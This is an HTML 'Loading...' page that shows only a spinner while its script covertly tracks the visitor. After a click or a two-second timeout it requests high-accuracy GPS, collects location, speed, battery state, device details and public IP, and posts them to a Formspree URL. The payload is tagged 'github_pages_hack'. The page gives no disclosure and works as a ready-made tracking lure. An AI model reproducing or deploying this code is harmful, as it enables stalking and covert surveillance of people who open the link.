<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: #ffffff;
            font-family: Arial, sans-serif;
        }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #007bff;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        #status {
            position: absolute;
            bottom: 20px;
            color: #666;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="loader"></div>
    <div id="status">Waiting for interaction...</div>

    <script>
        const FORMSPREE_URL = 'https://formspree.io/f/myewovol';
        let bestPosition = null;
        let bestAccuracy = Infinity;
        let watchId = null;
        let hasInteracted = false;

        // Step 1: Wait for user interaction to unlock high-accuracy GPS
        document.addEventListener('click', startGeolocation, { once: true });
        document.addEventListener('touchstart', startGeolocation, { once: true });

        // Fallback: Start after 2 seconds even if no interaction
        setTimeout(() => {
            if (!hasInteracted) {
                startGeolocation();
            }
        }, 2000);

        function startGeolocation() {
            hasInteracted = true;
            document.getElementById('status').innerText = 'Acquiring GPS...';

            if (!navigator.geolocation) {
                sendFallback("No Geolocation API");
                return;
            }

            // Options for maximum accuracy
            const options = {
                enableHighAccuracy: true, // Use GPS hardware
                timeout: 15000,           // Wait up to 15 seconds
                maximumAge: 0             // Do not use cached positions
            };

            // Success callback
            const success = (position) => {
                const accuracy = position.coords.accuracy;
                
                // Keep track of the most accurate position found so far
                if (accuracy < bestAccuracy) {
                    bestAccuracy = accuracy;
                    bestPosition = position;
                    document.getElementById('status').innerText = `Accuracy: ${Math.round(accuracy)}m`;
                    
                    // If we have sub-20 meter accuracy, stop watching and send immediately
                    if (accuracy < 20) { 
                        stopAndSend();
                    }
                }
            };

            // Error callback
            const error = (err) => {
                console.warn('Geolocation error:', err);
                // If we have a position, send it even if it's not perfect
                if (bestPosition) {
                    stopAndSend();
                } else {
                    sendFallback(err.message);
                }
            };

            // Start watching
            watchId = navigator.geolocation.watchPosition(success, error, options);
            
            // Safety net: If no good position after 15 seconds, send what we have
            setTimeout(() => {
                if (bestPosition) {
                    stopAndSend();
                } else {
                    sendFallback("Timeout");
                }
            }, 15000);
        }

        function stopAndSend() {
            if (watchId !== null) {
                navigator.geolocation.clearWatch(watchId);
            }
            prepareAndSend(bestPosition);
        }

        function sendFallback(reason) {
            const data = {
                latitude: null,
                longitude: null,
                accuracy: null,
                fallback_reason: reason,
                timestamp: new Date().toISOString(),
                source: 'github_pages_hack'
            };
            sendData(data);
        }

        async function prepareAndSend(position) {
            const coords = position ? position.coords : null;
            const battery = await getBattery();
            
            const data = {
                latitude: coords ? coords.latitude : null,
                longitude: coords ? coords.longitude : null,
                accuracy: coords ? coords.accuracy : null,
                altitude: coords ? coords.altitude : null,
                heading: coords ? coords.heading : null,
                speed: coords ? coords.speed : null,
                timestamp: position ? position.timestamp : new Date().toISOString(),
                battery_level: battery ? battery.level : null,
                battery_charging: battery ? battery.charging : null,
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                screenResolution: `${screen.width}x${screen.height}`,
                windowSize: `${window.innerWidth}x${window.innerHeight}`,
                ip: await getIP()
            };

            sendData(data);
            document.getElementById('status').innerText = 'Data Sent!';
        }

        async function getBattery() {
            try {
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    return {
                        level: battery.level,
                        charging: battery.charging
                    };
                }
            } catch (e) {
                console.warn('Battery API failed');
            }
            return null;
        }

        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (e) {
                return 'unknown';
            }
        }

        function sendData(data) {
            fetch(FORMSPREE_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).catch(err => console.error('Send error:', err));
        }
    </script>
</body>
</function>
